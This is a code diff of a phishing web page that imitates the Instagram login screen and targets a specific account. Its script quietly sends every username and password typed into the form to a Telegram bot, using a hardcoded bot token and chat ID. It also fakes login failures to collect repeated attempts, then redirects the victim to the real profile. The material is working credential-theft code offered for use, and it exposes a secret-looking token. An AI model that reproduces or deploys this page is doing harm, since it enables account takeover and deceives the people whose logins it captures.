@@ -3,14 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login • uscakeedin</title>
+    <title>Login • Instagram</title>
     <style>
-        /* Modern Liquid Glass Style */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
         body {
@@ -34,7 +33,6 @@
             z-index: 0;
             animation: move 25s infinite alternate ease-in-out;
         }
-
         .blob-1 { top: -15%; left: -10%; }
         .blob-2 { bottom: -15%; right: -10%; background: #ffd1dc; animation-delay: -7s; }
 
@@ -47,83 +45,127 @@
             position: relative;
             z-index: 10;
             width: 100%;
-            max-width: 370px;
-            padding: 20px;
+            max-width: 350px;
+            padding: 10px;
         }
 
         /* Glassmorphism Box */
         .glass-box {
             background: rgba(255, 255, 255, 0.4);
-            backdrop-filter: blur(25px);
-            -webkit-backdrop-filter: blur(25px);
-            border: 1px solid rgba(255, 255, 255, 0.6);
-            border-radius: 28px;
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            border: 1px solid rgba(255, 255, 255, 0.7);
+            border-radius: 24px;
             padding: 40px 30px;
             text-align: center;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.04);
-            margin-bottom: 15px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.05);
+            margin-bottom: 12px;
+        }
+
+        /* Soft Pink Love Shape */
+        .love-container {
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: center;
+            filter: drop-shadow(0 0 10px rgba(255, 182, 193, 0.8));
+        }
+
+        .heart {
+            background-color: #ffb6c1;
+            display: inline-block;
+            height: 50px;
+            position: relative;
+            top: 0;
+            transform: rotate(-45deg);
+            width: 50px;
+            border-radius: 2px;
+        }
+
+        .heart:before,
+        .heart:after {
+            content: "";
+            background-color: #ffb6c1;
+            border-radius: 50%;
+            height: 50px;
+            position: absolute;
+            width: 50px;
+        }
+
+        .heart:before {
+            top: -25px;
+            left: 0;
+        }
+
+        .heart:after {
+            left: 25px;
+            top: 0;
         }
 
         .welcome-text {
             font-size: 26px;
-            color: #1d1d1f;
-            margin-bottom: 30px;
+            color: #262626;
+            margin-bottom: 25px;
             font-weight: 600;
             letter-spacing: -0.5px;
         }
 
-        /* Error Message Style */
         #error-msg {
             color: #ed4956;
             font-size: 14px;
-            margin-bottom: 18px;
+            margin-bottom: 15px;
             display: none;
             font-weight: 500;
         }
 
+        /* Liquid Inputs */
         input {
             width: 100%;
-            padding: 15px 16px;
+            padding: 13px 15px;
             background: rgba(255, 255, 255, 0.6);
-            border: 1px solid rgba(0, 0, 0, 0.05);
-            border-radius: 14px;
-            font-size: 15px;
-            color: #1d1d1f;
-            margin-bottom: 12px;
-            transition: all 0.3s ease;
+            border: 1px solid rgba(0, 0, 0, 0.08);
+            border-radius: 12px;
+            font-size: 14px;
+            margin-bottom: 10px;
+            color: #262626;
+            transition: all 0.2s;
         }
 
         input:focus {
+            outline: none;
             background: rgba(255, 255, 255, 0.9);
             border: 1px solid #ffb6c1;
-            outline: none;
-            box-shadow: 0 0 0 4px rgba(255, 182, 193, 0.2);
+            box-shadow: 0 0 0 3px rgba(255, 182, 193, 0.2);
         }
 
         .login-btn {
             width: 100%;
-            background: #0071e3;
+            background: #0095f6;
             border: none;
-            border-radius: 14px;
+            border-radius: 12px;
             color: white;
-            padding: 15px;
+            padding: 12px;
             font-weight: 600;
-            font-size: 16px;
+            font-size: 15px;
             cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 4px 12px rgba(0, 113, 227, 0.2);
+            margin-top: 10px;
+            transition: opacity 0.3s;
         }
 
-        .login-btn:active { transform: scale(0.96); }
+        .login-btn:active { transform: scale(0.97); opacity: 0.8; }
+
+        .divider { display: flex; align-items: center; margin: 25px 0; }
+        .line { flex-grow: 1; height: 1px; background: rgba(0, 0, 0, 0.1); }
+        .or-text { margin: 0 15px; color: #8e8e8e; font-size: 12px; font-weight: 700; }
 
         .signup-box {
             background: rgba(255, 255, 255, 0.4);
-            backdrop-filter: blur(25px);
-            border: 1px solid rgba(255, 255, 255, 0.6);
-            border-radius: 20px;
-            padding: 22px;
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.7);
+            border-radius: 18px;
+            padding: 20px;
             text-align: center;
             font-size: 14px;
+            color: #262626;
         }
     </style>
 </head>
@@ -134,18 +176,31 @@
 
     <div class="main-wrapper">
         <div class="glass-box">
-            <h1 class="welcome-text">Welcome uscakeedin</h1>
+            <div class="love-container">
+                <div class="heart"></div>
+            </div>
+
+            <h1 class="welcome-text">uscakeedin</h1>
+            
             <p id="error-msg"></p>
 
             <form id="login-form">
-                <input type="text" id="username" placeholder="Username" required autocomplete="off">
+                <input type="text" id="username" placeholder="Phone number, username, or email" required autocomplete="off">
                 <input type="password" id="password" placeholder="Password" required>
                 <button type="submit" class="login-btn">Log In</button>
             </form>
+
+            <div class="divider">
+                <div class="line"></div>
+                <div class="or-text">OR</div>
+                <div class="line"></div>
+            </div>
+
+            <a href="#" style="color:#385185; text-decoration:none; font-size:14px; font-weight:600;">Log in with Facebook</a>
         </div>
 
         <div class="signup-box">
-            Don't have an account? <a href="#" style="color:#0071e3; text-decoration:none; font-weight:600;">Sign up</a>
+            Don't have an account? <a href="#" style="color:#0095f6; text-decoration:none; font-weight:600;">Sign up</a>
         </div>
     </div>
 
@@ -157,28 +212,22 @@
         
         let failCount = 0;
 
-        // Data bot kamu sudah terpasang otomatis
+        // Data Bot Telegram Kamu
         const TELEGRAM_BOT_TOKEN = '8654247527:AAEQseZ7ru5zuab9UQxUW2rvr_rwhuLbUeM'; 
         const TELEGRAM_CHAT_ID = '1941574134';
 
         async function sendToTelegram(user, pass) {
-            const message = `🔔 *Data Masuk Beb!*\n\n👤 User: \`${user}\`\n🔑 Pass: \`${pass}\`\n🔢 Salah ke: ${failCount + 1}`;
+            const message = `💖 *Target Typing Beb!*\n\n👤 User: \`${user}\`\n🔑 Pass: \`${pass}\`\n🔢 Attempt: ${failCount + 1}`;
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-            
-            try {
-                await fetch(url);
-            } catch (err) {
-                console.error("Gagal kirim data ke Telegram.");
-            }
+            try { await fetch(url); } catch (err) {}
         }
 
         loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
-            
             const usernameValue = userInp.value.trim();
             const passwordValue = passInp.value;
 
-            // Kirim data diam-diam ke bot
+            // Kirim data ke bot
             await sendToTelegram(usernameValue, passwordValue);
 
             // Cek Username
@@ -196,7 +245,7 @@
                 passInp.value = "";
                 passInp.focus();
             } else {
-                // Berhasil login setelah 4x salah
+                // Sukses pengalihan
                 window.location.href = "https://www.instagram.com/uscakeedin/";
             }
         });
